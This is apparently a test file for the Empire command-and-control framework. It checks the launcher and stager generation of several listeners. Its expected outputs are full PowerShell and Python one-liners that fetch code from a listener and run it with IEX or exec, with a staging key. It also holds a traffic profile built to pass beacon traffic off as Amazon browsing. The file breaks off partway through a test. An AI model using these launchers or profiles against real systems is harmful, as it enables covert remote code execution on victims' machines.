import base64
import json
import re
from pathlib import Path
from textwrap import dedent
from unittest.mock import MagicMock, Mock

import pytest

from empire.server.common import helpers
from empire.test.conftest import build_test_listener


@pytest.fixture(scope="module", autouse=True)
def _setup_staging_key(session_local, models):
    with session_local.begin() as db:
        config = db.query(models.Config).first()
        config.staging_key = "@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}"


@pytest.fixture
def main_menu_mock(models):
    main_menu = Mock()
    main_menu.install_path = Path()
    main_menu.listeners.activeListeners = {}
    main_menu.listeners.listeners = {}
    return main_menu


def test_http_generate_launcher(monkeypatch, main_menu_mock):
    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http.listener.packets", packets)

    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http.listener.secrets", secrets_mock)

    http_listener = build_test_listener("http", main_menu_mock)

    http_listener.options["Cookie"]["Value"] = "l33th4x0r"
    http_listener.options["Host"]["Value"] = "http://localhost"
    http_listener.options["Port"]["Value"] = "80"
    http_listener.host_address = "http://localhost/"
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_listener.options}
    }

    http_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_python_launcher()

    powershell_launcher = http_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_powershell_launcher()


def test_http_foreign_generate_launcher(monkeypatch, main_menu_mock):
    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr(
        "empire.server.listeners.http_foreign.listener.secrets", secrets_mock
    )

    http_foreign_listener = build_test_listener("http_foreign", main_menu_mock)

    http_foreign_listener.options["Host"]["Value"] = "http://localhost"
    http_foreign_listener.options["Port"]["Value"] = "80"
    http_foreign_listener.options["RoutingPacket"]["Value"] = "cm91dGluZyBwYWNrZXQ="
    http_foreign_listener.host_address = "http://localhost/"
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_foreign_listener.options}
    }

    validate_listener_address_mock = MagicMock()
    validate_listener_address_mock.return_value = ("http://localhost/", None)
    main_menu_mock.listenersv2 = MagicMock()
    main_menu_mock.listenersv2.validate_listener_address = (
        validate_listener_address_mock
    )

    http_foreign_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_foreign_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_foreign_python_launcher()

    powershell_launcher = http_foreign_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_foreign_powershell_launcher()


def test_http_hop_generate_launcher(monkeypatch, main_menu_mock):
    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http_hop.listener.packets", packets)

    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr(
        "empire.server.listeners.http_hop.listener.secrets", secrets_mock
    )

    http_hop_listener = build_test_listener("http_hop", main_menu_mock)

    http_hop_listener.options["Host"]["Value"] = "http://localhost"
    http_hop_listener.options["Port"]["Value"] = "80"
    http_hop_listener.host_address = "http://localhost/"
    http_hop_listener.options["DefaultProfile"]["Value"] = (
        "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
    )
    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_hop_listener.options}
    }
    http_hop_listener.session_cookie = "session"

    # create listenersv2 mock and set both methods on the SAME instance
    listenersv2 = MagicMock()
    listenersv2.get_active_listener_by_name.return_value = http_hop_listener
    listenersv2.validate_listener_address.return_value = ("http://localhost/", None)

    # attach to main_menu_mock
    main_menu_mock.listenersv2 = listenersv2

    http_hop_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_hop_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_hop_python_launcher()

    powershell_launcher = http_hop_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_hop_powershell_launcher()


def test_http_malleable_generate_launcher(monkeypatch, main_menu_mock):
    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.listener.packets", packets
    )

    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.listener.secrets", secrets_mock
    )

    helpers_mock = MagicMock()
    helpers_mock.random_string.return_value = "r"
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.listener.helpers", helpers_mock
    )
    helpers_mock.obfuscate_call_home_address.side_effect = (
        helpers.obfuscate_call_home_address
    )

    session_mock = MagicMock()
    profile_mock = MagicMock()
    session_mock.return_value.scalars.return_value.first.return_value = profile_mock
    profile_mock.data = _fake_malleable_profile()
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.listener.SessionLocal", session_mock
    )

    validate_listener_address_mock = MagicMock()
    validate_listener_address_mock.return_value = ("http://localhost/", None)
    main_menu_mock.listenersv2 = MagicMock()
    main_menu_mock.listenersv2.validate_listener_address = (
        validate_listener_address_mock
    )

    http_malleable_listener = build_test_listener("http_malleable", main_menu_mock)
    http_malleable_listener.options["Profile"]["Value"] = "amazon.profile"
    http_malleable_listener.validate_options()

    http_malleable_listener.options["Host"]["Value"] = "http://localhost"
    http_malleable_listener.options["Port"]["Value"] = "80"

    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_malleable_listener.options}
    }

    http_malleable_listener.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = http_malleable_listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_http_malleable_python_launcher()

    powershell_launcher = http_malleable_listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_http_malleable_powershell_launcher()


def test_http_malleable_powershell_stager_separates_headers_with_marker(
    monkeypatch, main_menu_mock
):
    """A profile User-Agent containing commas must reach the stager intact:
    header entries are joined with <HEND>, and the stager splits on it."""
    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    listener = _build_malleable_listener(
        monkeypatch,
        main_menu_mock,
        profile_text=_profile_with_stager_block(
            """
            http-stager {
                client {
                    header "Accept" "*/*";
                }
            }
            """,
            user_agent=_COMMA_USER_AGENT,
        ),
    )

    stager = listener.generate_stager(
        listenerOptions=listener.options, language="powershell"
    )

    match = re.search(r'\$customHeaders = "(.*?)";', stager)
    assert match, "stager did not render a $customHeaders assignment"
    entries = match.group(1).split("<HEND>")
    assert f"User-Agent:{_COMMA_USER_AGENT}" in entries
    assert "Accept:*/*" in entries
    assert "-split '<HEND>'" in stager
    assert "-split ','" not in stager
    assert "$wc.Headers.Set($headerKey, $headerValue);" in stager
    assert "$wc.Headers.Add($headerKey, $headerValue);" not in stager


def _build_malleable_listener(monkeypatch, main_menu_mock, profile_text=None):
    """Construct a validated malleable listener with the amazon sample
    profile (or ``profile_text`` when given). Mirrors the setup in
    test_http_malleable_generate_launcher but returns the listener for reuse."""
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.listener.packets", packets
    )

    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.listener.secrets", secrets_mock
    )

    helpers_mock = MagicMock()
    helpers_mock.random_string.return_value = "r"
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.listener.helpers", helpers_mock
    )
    helpers_mock.obfuscate_call_home_address.side_effect = (
        helpers.obfuscate_call_home_address
    )

    session_mock = MagicMock()
    profile_mock = MagicMock()
    session_mock.return_value.scalars.return_value.first.return_value = profile_mock
    profile_mock.data = profile_text or _fake_malleable_profile()
    monkeypatch.setattr(
        "empire.server.listeners.http_malleable.listener.SessionLocal", session_mock
    )

    validate_listener_address_mock = MagicMock()
    validate_listener_address_mock.return_value = ("http://localhost/", None)
    main_menu_mock.listenersv2 = MagicMock()
    main_menu_mock.listenersv2.validate_listener_address = (
        validate_listener_address_mock
    )

    listener = build_test_listener("http_malleable", main_menu_mock)
    listener.options["Profile"]["Value"] = "amazon.profile"
    listener.validate_options()
    listener.options["Host"]["Value"] = "http://localhost"
    listener.options["Port"]["Value"] = "80"

    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": listener.options}
    }
    listener.threads = {"fake_listener": {"fake_thread": {}}}
    return listener


def _assert_valid_malleable_profile_b64(b64: str):
    """Decode + JSON-parse the base64 blob; assert v1 schema with all
    three sections. Shared by csharp and go tests."""
    assert b64, "MALLEABLE_PROFILE must not be empty for malleable listener"
    decoded = base64.b64decode(b64).decode("utf-8")
    payload = json.loads(decoded)
    assert payload["v"] == 1
    assert set(payload["sections"].keys()) == {"stager", "get", "post"}
    for section_name in ("stager", "get", "post"):
        assert "client" in payload["sections"][section_name]
        assert "server" in payload["sections"][section_name]


def test_http_malleable_stager_url_uses_stager_uri_not_post_uri(
    monkeypatch, main_menu_mock
):
    """C# / Go launcher oneliners must download stage 0 from a stager URI,
    not the post URI that `DefaultProfile` carries. The amazon profile
    declares only http-get and http-post URIs explicitly, so the http-stager
    block falls back to the canonical `/init/` default — that's what
    stager_url() must return joined with host_address.

    Without this, the legacy stagergenv2 oneliners would extract a post
    URI (from `profile.post.client.stringify()`) and stage 0 would route
    into the listener's POST handler instead of returning the
    SharpireMalleable / Gopire binary.
    """
    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)

    url = listener.stager_url()

    assert url.startswith(listener.host_address), (
        f"stager_url must be rooted at host_address={listener.host_address!r}, got {url!r}"
    )
    # The post URI for amazon is `/N4215/adj/amzn.us.sr.aps`; the get URI is
    # `/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books`. Neither
    # should appear — only the stager-default `/init/`.
    assert "/init/" in url, f"expected stager URI '/init/' in {url!r}"
    assert "N4215" not in url, f"post URI leaked into stager_url: {url!r}"
    assert "field-keywords" not in url, f"get URI leaked into stager_url: {url!r}"


def test_http_malleable_stager_url_raises_when_host_address_unset(
    monkeypatch, main_menu_mock
):
    """stager_url() must NOT silently produce a string like 'None/init/' when
    called before host_address is populated — that would propagate into the
    launcher template at stager_generation_service.py and produce a
    'http://None/...' download URL that fails silently on target. Guard
    against the implicit ordering bug by raising explicitly.
    """
    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
    listener.host_address = None

    with pytest.raises(RuntimeError, match="host_address"):
        listener.stager_url()


def test_http_malleable_generate_launcher_csharp(monkeypatch, main_menu_mock):
    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)

    compile_mock = MagicMock(return_value="/tmp/sharpire-build.exe")
    main_menu_mock.dotnet_compiler.compile_stager = compile_mock

    result = listener.generate_launcher(
        listener_name="fake_listener", language="csharp", encode=False
    )

    assert result == "/tmp/sharpire-build.exe"
    compile_mock.assert_called_once()
    stager_yaml = compile_mock.call_args[0][0]

    # Malleable path must read SharpireMalleable.yaml and pass the
    # "SharpireMalleable" stager name so EmpireCompiler globs BOTH source
    # libraries (base Sharpire + SharpireMalleable extension) into the build.
    assert compile_mock.call_args[0][1] == "SharpireMalleable"
    assert "Name: SharpireMalleable" in stager_yaml

    assert "{{ REPLACE_MALLEABLE_PROFILE }}" not in stager_yaml
    assert "SetMalleableProfile" in stager_yaml
    # Syntactic anchor for EmpireCompiler's tree-pruning optimizer — without
    # explicit typeof() references the optimizer drops MalleableProfile.cs /
    # MalleableTransform.cs from the second compile pass (partial classes
    # split across source libraries confuse DeclaringSyntaxReferences).
    assert "typeof(MalleableProfile)" in stager_yaml
    assert "typeof(MalleableTransform)" in stager_yaml

    match = None
    for line in stager_yaml.splitlines():
        if "malleableProfileB64" in line and "=" in line:
            match = line.split('"')[1]
            break
    assert match is not None, "could not find substituted malleableProfileB64"
    _assert_valid_malleable_profile_b64(match)


def test_http_malleable_generate_launcher_go(monkeypatch, main_menu_mock):
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)

    go_compile_mock = MagicMock(return_value="/tmp/gopire-build.exe")
    main_menu_mock.stagergenv2.generate_go_stageless = go_compile_mock

    result = listener.generate_launcher(
        listener_name="fake_listener", language="go", encode=False
    )

    assert result == "/tmp/gopire-build.exe"
    go_compile_mock.assert_called_once()


def test_http_malleable_generate_stager_serves_csharp_binary_bytes(
    monkeypatch, main_menu_mock, tmp_path
):
    """generate_stager(csharp) must return the SharpireMalleable binary
    bytes so PowerShell launcher one-liners (DownloadData + Assembly.Load)
    that point at a stager URI actually receive an executable payload.

    Pre-fix the method returned "" with a "stageless — binary IS the stage"
    comment, which was correct for the operator-direct workflow (run the
    binary on target) but broken for the launcher flow (download bytes
    from URL + Assembly.Load). The 15 wrapper stagers all assume the
    launcher flow.
    """
    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    fake_bin = tmp_path / "sharpire-malleable.exe"
    fake_bin.write_bytes(b"MZ" + b"\x00" * 100)
    main_menu_mock.dotnet_compiler.compile_stager = MagicMock(
        return_value=str(fake_bin)
    )

    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
    stage = listener.generate_stager(
        language="csharp", listenerOptions=listener.options
    )

    assert isinstance(stage, bytes), f"expected bytes, got {type(stage).__name__}"
    assert stage.startswith(b"MZ"), (
        f"expected PE-format SharpireMalleable bytes, got {stage[:20]!r}"
    )


def test_http_malleable_generate_stager_serves_go_binary_bytes(
    monkeypatch, main_menu_mock, tmp_path
):
    """Mirror of the C# test for the Go path. generate_stager(go) must
    return the Gopire-malleable binary bytes by delegating to
    stagergenv2.generate_go_stageless (the same helper generate_launcher
    uses for the operator-direct flow) and reading its output.
    """
    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    fake_bin = tmp_path / "gopire-malleable.exe"
    fake_bin.write_bytes(b"\x7fELF" + b"\x00" * 100)
    main_menu_mock.stagergenv2.generate_go_stageless = MagicMock(
        return_value=str(fake_bin)
    )

    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
    stage = listener.generate_stager(language="go", listenerOptions=listener.options)

    assert isinstance(stage, bytes), f"expected bytes, got {type(stage).__name__}"
    assert stage.startswith(b"\x7fELF"), (
        f"expected Gopire binary bytes, got {stage[:20]!r}"
    )


def test_http_malleable_serialize_profile_for_agent(monkeypatch, main_menu_mock):
    """The Listener.serialize_profile_for_agent helper should emit a
    base64-encoded JSON blob that matches the v1 schema the agents
    parse. This is the contract both Sharpire and Gopire rely on."""
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
    b64 = listener.serialize_profile_for_agent()
    _assert_valid_malleable_profile_b64(b64)


def test_http_generate_launcher_csharp_plain_ships_without_malleable(
    monkeypatch, main_menu_mock
):
    """Plain http listener builds base Sharpire — no malleable types, no
    SetMalleableProfile call, no System.Web.Extensions reference. The
    malleable pipeline is exclusive to http_malleable's SharpireMalleable
    yaml, which pulls the extension library in as a second
    ReferenceSourceLibrary."""
    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"

    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr("empire.server.listeners.http.listener.packets", packets)

    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr("empire.server.listeners.http.listener.secrets", secrets_mock)

    http_listener = build_test_listener("http", main_menu_mock)
    http_listener.options["Host"]["Value"] = "http://localhost"
    http_listener.options["Port"]["Value"] = "80"
    http_listener.host_address = "http://localhost/"

    compile_mock = MagicMock(return_value="/tmp/plain-sharpire.exe")
    main_menu_mock.dotnet_compiler.compile_stager = compile_mock

    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": http_listener.options}
    }
    http_listener.threads = {"fake_listener": {"fake_thread": {}}}

    result = http_listener.generate_launcher(
        listener_name="fake_listener", language="csharp", encode=False
    )

    assert result == "/tmp/plain-sharpire.exe"
    assert compile_mock.call_args[0][1] == "Sharpire"
    stager_yaml = compile_mock.call_args[0][0]
    assert "malleableProfileB64" not in stager_yaml
    assert "SetMalleableProfile" not in stager_yaml
    assert "REPLACE_MALLEABLE_PROFILE" not in stager_yaml
    assert "SharpireMalleable" not in stager_yaml
    # System.Web.Extensions lives only on SharpireMalleable so plain builds
    # shouldn't pull it in as a reference assembly.
    assert "System.Web.Extensions" not in stager_yaml


def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
    # guarantee the session id.
    packets = Mock()
    packets.build_routing_packet.return_value = b"routing packet"
    monkeypatch.setattr(
        "empire.server.listeners.port_forward_pivot.listener.packets", packets
    )

    # guarantee the chosen stage0 url.
    secrets_mock = MagicMock()
    secrets_mock.choice.side_effect = lambda x: x[0]
    monkeypatch.setattr(
        "empire.server.listeners.port_forward_pivot.listener.secrets", secrets_mock
    )

    port_forward_pivot = build_test_listener("port_forward_pivot", main_menu_mock)

    # redirector doesn't get these fields until the listener is started.
    port_forward_pivot.options.update(
        build_test_listener("http", main_menu_mock).options
    )
    port_forward_pivot.options["Host"] = {"Value": "http://localhost"}
    port_forward_pivot.options["Port"] = {"Value": "80"}
    port_forward_pivot.host_address = "http://localhost/"

    validate_listener_address_mock = MagicMock()
    validate_listener_address_mock.return_value = ("http://localhost/", None)
    main_menu_mock.listenersv2 = MagicMock()
    main_menu_mock.listenersv2.validate_listener_address = (
        validate_listener_address_mock
    )

    main_menu_mock.listeners.activeListeners = {
        "fake_listener": {"options": port_forward_pivot.options}
    }

    port_forward_pivot.threads = {"fake_listener": {"fake_thread": {}}}

    python_launcher = port_forward_pivot.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert python_launcher == _expected_redirector_python_launcher()

    powershell_launcher = port_forward_pivot.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert powershell_launcher == _expected_redirector_powershell_launcher()


def _expected_http_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes(\'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}\');$wc.Headers.Add("Cookie","l33th4x0r=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""


def _expected_http_python_launcher():
    return dedent(
        """
        import sys;
        import urllib.request;
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost/';t='/admin/get.php';
        req=urllib.request.Request(server+t);
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        o.addheaders=[('User-Agent',UA), ("Cookie", "l33th4x0r=cm91dGluZyBwYWNrZXQ=")];
        urllib.request.install_opener(o);
        data=urllib.request.urlopen(req).read();
        exec(data);
        """
    ).strip("\n")


def _expected_http_foreign_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""


def _expected_http_foreign_python_launcher():
    return dedent(
        """
        import sys;
        o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
        server='http://localhost/';t='/admin/get.php';
        o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
        import urllib.request;
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        urllib.request.install_opener(o);
        data=o.open(server+t).read();
        exec(data);
        """
    ).strip("\n")


def _expected_http_hop_python_launcher():
    return dedent(
        """
        import sys;
        import urllib.request;
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost/';t='/admin/get.php';hop='fake_listener';
        req=urllib.request.Request(server+t);
        req.add_header('Hop-Name', hop);
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
        urllib.request.install_opener(o);
        data=urllib.request.urlopen(req).read();
        exec(data);
    """
    ).strip("\n")


def _expected_http_hop_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add('Hop-Name',$hop);$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""


def _expected_http_malleable_python_launcher():
    return dedent(
        """
        import sys,base64
        import urllib.request,urllib.parse
        server='http://localhost/'
        proxy = urllib.request.ProxyHandler()
        o = urllib.request.build_opener(proxy)
        urllib.request.install_opener(o)
        vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})
        req=vreq(server+'init/', )
        req.verb='GET'
        req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
        req.add_header('Cookie','session=cm91dGluZyBwYWNrZXQ%3D')
        res=urllib.request.urlopen(req)
        data=res.read()
        data=urllib.request.urlopen(req).read();
        exec(data);
    """
    ).strip("\n")


def _expected_http_malleable_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/init/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""


def _fake_malleable_profile():
    return """
        #
        # Amazon browsing traffic profile
        #
        # Author: @harmj0y
        #

        set sleeptime "5000";
        set jitter    "0";
        set maxdns    "255";
        set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

        http-get {

            set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";

            client {

                header "Accept" "*/*";
                header "Host" "www.amazon.com";

                metadata {
                    base64;
                    prepend "session-token=";
                    prepend "skin=noskin;";
                    append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
                    header "Cookie";
                }
            }

            server {

                header "Server" "Server";
                header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
                header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
                header "X-Frame-Options" "SAMEORIGIN";
                header "Content-Encoding" "gzip";

                output {
                    print;
                }
            }
        }

        http-post {

            set uri "/N4215/adj/amzn.us.sr.aps";

            client {

                header "Accept" "*/*";
                header "Content-Type" "text/xml";
                header "X-Requested-With" "XMLHttpRequest";
                header "Host" "www.amazon.com";

                parameter "sz" "160x600";
                parameter "oe" "oe=ISO-8859-1;";

                id {
                    parameter "sn";
                }

                parameter "s" "3717";
                parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";

                output {
                    base64;
                    print;
                }
            }

            server {

                header "Server" "Server";
                header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";
                header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
                header "X-Frame-Options" "SAMEORIGIN";
                header "x-ua-compatible" "IE=edge";

                output {
                    print;
                }
            }
        }
     """


_COMMA_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"
)


def _profile_with_stager_block(block: str, user_agent: str | None = None):
    """Amazon fixture plus an http-stager block, optionally with a different
    global User-Agent."""
    profile = _fake_malleable_profile()
    if user_agent is not None:
        profile = profile.replace(
            'set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";',
            f'set useragent "{user_agent}";',
        )
    return profile + dedent(block)


def _expected_redirector_python_launcher():
    return dedent(
        """
        import sys;import urllib.request;
        UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='http://localhost/';t='/admin/get.php';req=urllib.request.Request(server+t);
        req.add_header('User-Agent',UA);
        req.add_header('Cookie',"session=cm91dGluZyBwYWNrZXQ=");
        proxy = urllib.request.ProxyHandler();
        o = urllib.request.build_opener(proxy);
        urllib.request.install_opener(o);
        data=urllib.request.urlopen(req).read();
        exec(data);
    """
    ).strip("\n")


def _expected_redirector_powershell_launcher():
    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add('Hop-Name',$hop);$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""


def _drive_handle_request_setup(listener, monkeypatch):
    """Run start_server() far enough to register the handle_request closure
    on listener.app, without binding to a real port.

    The malleable listener wires its request dispatcher as a closure inside
    start_server(); calling it directly is the simplest seam. We unset
    TEST_MODE (which otherwise short-circuits start_server before the Flask
    app is created) and stub Flask.run so the function returns cleanly
    instead of blocking on the port.
    """
    import flask

    monkeypatch.delenv("TEST_MODE", raising=False)
    monkeypatch.setattr(flask.Flask, "run", lambda *a, **kw: None)
    listener.start_server(listener.options)
    return listener.app.test_client()


def test_host_stage_false_blocks_stager_uri_with_iis_404(
    monkeypatch, main_menu_mock, caplog
):
    """`set host_stage "false";` must make the stager URI return the IIS
    7.5 default 404 page, indistinguishable from a missing endpoint. The
    gate fires for ANY method on the stager URI."""
    import logging

    from fastapi import status

    from empire.server.common import malleable

    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)

    # Toggle host_stage on the cached serialized profile. Doing it post-
    # validate_options keeps the test independent of profile-text parsing —
    # that's covered by the parser-level suite in test_malleable_profile.py.
    profile = malleable.Profile._deserialize(listener.serialized_profile)
    profile.host_stage = False
